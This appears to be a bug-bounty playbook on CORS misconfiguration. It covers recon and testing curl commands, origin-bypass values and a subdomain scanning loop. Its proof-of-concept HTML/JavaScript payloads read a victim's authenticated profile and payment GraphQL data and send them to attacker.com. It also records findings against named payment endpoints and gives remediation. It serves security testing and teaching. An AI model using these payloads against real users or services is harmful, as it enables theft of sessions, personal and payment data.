# CORS Misconfiguration Playbook

**Category:** Access Control / Information Disclosure
**Typical Severity:** Medium–Critical
**CVSS Range:** 4.3–9.1
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)

---

## Overview

Cross-Origin Resource Sharing (CORS) misconfigurations allow attacker-controlled websites to make authenticated cross-origin requests to a target API on behalf of a victim user. The two most dangerous patterns are:

1. **Origin Reflection + Credentials**: Server reflects any `Origin` header value in `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`
2. **Wildcard + Credentials** (spec violation): `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`

A third pattern — wildcard without credentials — is lower severity but still worth reporting on sensitive endpoints (payment APIs, admin panels).

---

## Real-World Impact

- **Account takeover**: Steal session tokens, auth cookies, or API keys from authenticated users
- **Payment data theft**: Read payment session state, transaction history, stored card details
- **PII exfiltration**: Dump profile data, address books, order history
- **Lateral mutation**: Execute state-changing API requests (transfers, purchases, email changes) using the victim's active session
- **OAuth token theft**: Read access tokens from identity provider responses

**Documented payouts:** CORS findings on payment/auth infrastructure routinely earn $500–$5,000+. A reflect+credentials finding on a payment GraphQL API is typically High severity.

---

## Recon Methodology

### Step 1 — Identify CORS-relevant endpoints

Focus on endpoints that:
- Require authentication (session cookie or Bearer token)
- Return sensitive data (profile, payment, orders, tokens)
- Are called cross-origin by the main application (check `Origin` headers in DevTools)

```bash
# Find subdomains with CORS headers
subfinder -d target.com | httpx -match-regex "access-control-allow-origin"

# Check specific endpoint
curl -si "https://api.target.com/v1/user/profile" \
  -H "Origin: https://attacker.com" \
  -H "Cookie: session=<your_session>"
```

### Step 2 — Map the origin policy

Test these origin values:
```bash
https://attacker.com               # basic reflection test
https://target.com.attacker.com    # prefix bypass
https://attackertarget.com         # suffix bypass
null                               # sandboxed iframe bypass
http://target.com                  # HTTP downgrade
https://sub.target.com             # subdomain trust
```

### Step 3 — Confirm credentials behavior

```bash
curl -si "https://api.target.com/sensitive" \
  -H "Origin: https://attacker.com" | grep -i "access-control"
```

Critical — check for **both**:
```
Access-Control-Allow-Origin: https://attacker.com  ← reflected
Access-Control-Allow-Credentials: true              ← credentials allowed
```

### Step 4 — Verify preflight

```bash
curl -si -X OPTIONS "https://api.target.com/v1/graphql" \
  -H "Origin: https://attacker.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: authorization, content-type"
```

If the preflight response allows `authorization` header cross-origin, you can send auth tokens from attacker-controlled pages.

---

## Testing Methodology

### Test 1 — Basic Reflection

```bash
curl -si "https://api.target.com/endpoint" \
  -H "Origin: https://evil.com" | grep "access-control"
```

**Vulnerable**: `access-control-allow-origin: https://evil.com` + `access-control-allow-credentials: true`

### Test 2 — Null Origin (Sandboxed Iframe)

```bash
curl -si "https://api.target.com/endpoint" \
  -H "Origin: null" | grep "access-control"
```

**Vulnerable**: `access-control-allow-origin: null` + `access-control-allow-credentials: true`
This allows exploitation from sandboxed iframes, bypassing some browser mitigations.

### Test 3 — Subdomain Trust

```bash
# If target trusts *.target.com
curl -si "https://api.target.com/endpoint" \
  -H "Origin: https://xss.target.com" | grep "access-control"
```

Combine with a subdomain takeover or XSS on a trusted subdomain for full exploit chain.

### Test 4 — Whitelist Bypass Patterns

```bash
# Prefix match bypass
-H "Origin: https://target.com.evil.com"

# Suffix match bypass
-H "Origin: https://eviltarget.com"

# Protocol variation
-H "Origin: http://target.com"
```

---

## Common Endpoints to Test

| Endpoint Type | Why It Matters |
|---|---|
| `/api/user/profile` | PII exfiltration |
| `/api/auth/token` | Token theft |
| `/v1/graphql` | Full API access via mutations |
| `/api/orders`, `/api/payments` | Payment/PII data |
| `/api/admin/*` | Privilege escalation |
| `identity.target.com/*` | OAuth/SSO token theft |
| `vgs-*.target.com` | Payment vault APIs (VGS) |
| `payment-gateway.*` | PCI-sensitive endpoints |

---

## Payload Examples

### Minimal PoC (read-only)

```html
<!-- Save as cors_poc.html, host on attacker.com -->
<script>
fetch('https://api.target.com/v1/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://attacker.com/collect?d=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
```

### GraphQL PoC

```html
<script>
fetch('https://api.target.com/v1/graphql', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({query: '{ currentUser { id email paymentMethods { last4 } } }'})
})
.then(r => r.json())
.then(data => navigator.sendBeacon('https://attacker.com/collect', JSON.stringify(data)));
</script>
```

### Sandboxed Iframe (null origin)

```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
fetch('https://api.target.com/sensitive', {credentials:'include'})
.then(r=>r.text())
.then(d=>parent.postMessage(d,'*'));
</script>
"></iframe>
<script>
window.onmessage = e => fetch('https://attacker.com/steal?d='+encodeURIComponent(e.data));
</script>
```

---

## Automation Ideas

```bash
# Scan all subdomains for CORS issues
subfinder -d target.com -silent | \
  httpx -silent | \
  while read url; do
    result=$(curl -si "$url" -H "Origin: https://evil.com" 2>/dev/null | \
             grep -i "access-control-allow-origin")
    if echo "$result" | grep -qi "evil.com\|null"; then
      echo "[VULN] $url: $result"
    fi
  done

# CORScan tool
python3 corscanner.py -u https://api.target.com -v

# ffuf for path discovery with CORS check
ffuf -u "https://api.target.com/FUZZ" -w /path/to/wordlist \
  -H "Origin: https://evil.com" -mr "access-control-allow-origin"
```

---

## Real Bug Bounty Examples

### Example 1 — PortSwigger Research (Bitcoin Exchange, ~$20K)
James Kettle's research documented CORS findings on a Bitcoin exchange that reflected any origin with credentials enabled. Full account takeover possible via a single `fetch()` call.

### Example 2 — Shopify (HackerOne, $3,000+)
A CORS misconfiguration on the Shopify admin API allowed reading merchant data cross-origin from any page a merchant visited.

### Example 3 — Various GraphQL APIs
Hasura and Apollo Server deployments frequently ship with permissive CORS defaults. The `HASURA_GRAPHQL_CORS_DOMAIN` env var defaults to allow all origins in development — and this setting sometimes makes it to production.

---

## Lab / Program Examples

### Boozt Fashion AB — HackerOne (2026-03-11)

**Report:** `~/BugBounty/hackerone/boozt/findings/FINDING-001-cors-misconfiguration-kronor-graphql.md`
**Severity:** High (CVSS 8.1)

**Finding:** The Hasura GraphQL payment API at `https://kronor.io/v1/graphql` reflects any arbitrary `Origin` header in `Access-Control-Allow-Origin` while also setting `Access-Control-Allow-Credentials: true`. Preflight confirmed the server allows the `authorization` header cross-origin.

**Attack chain:** A Boozt checkout user visiting an attacker-controlled page would have their active payment session tokens sent cross-origin to the Hasura API, with the response fully readable by the attacker's JavaScript.

**Key detail:** The `null` origin was also accepted — enabling exploitation from sandboxed iframes.

**Tech stack note:** Hasura GraphQL Engine v2.37.1 CE. The fix requires setting `HASURA_GRAPHQL_CORS_DOMAIN` to an explicit domain allowlist.

---

**Report:** `~/BugBounty/hackerone/boozt/findings/FINDING-004-cors-wildcard-payment-gateway.md`
**Severity:** Low-Medium

**Finding:** `https://payment-gateway.kronor.io` returns `Access-Control-Allow-Origin: *` on all responses. Lower severity than FINDING-001 since `credentials: true` is not present, but wildcard CORS on a PCI-sensitive payment gateway violates security best practices.

**Comparison table documented in finding:**
| Endpoint | CORS Policy | Credentials | Severity |
|---|---|---|---|
| `kronor.io/v1/graphql` | Reflects any origin | true | High |
| `payment-gateway.kronor.io` | Wildcard (*) | not set | Low-Medium |

---

### DoorDash — HackerOne (2026-03-13)

**Report:** `~/BugBounty/hackerone/doordash/findings/FINDING-001-cors-misconfiguration-vgs-payment.md`
**Severity:** Medium

**Finding:** `https://vgs-payment.doordash.com` returns `Access-Control-Allow-Origin: *`. No `credentials: true` present at time of testing, so immediate exploitability is limited. Reported as a misconfiguration with future-risk framing — if credential-bearing endpoints are introduced on this subdomain, the wildcard creates an immediate critical.

**Key note:** VGS (Very Good Security) is a payment data vault/proxy service. Any payment vault endpoint with permissive CORS warrants close attention.

---

## Remediation

```
# Correct configuration
Access-Control-Allow-Origin: https://www.target.com
Access-Control-Allow-Credentials: true

# NEVER do this
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true  # spec violation

# NEVER do this
Access-Control-Allow-Origin: <reflected from request>  # without allowlist
Access-Control-Allow-Credentials: true
```

For Hasura specifically:
```bash
HASURA_GRAPHQL_CORS_DOMAIN=https://www.boozt.com,https://www.booztlet.com
```
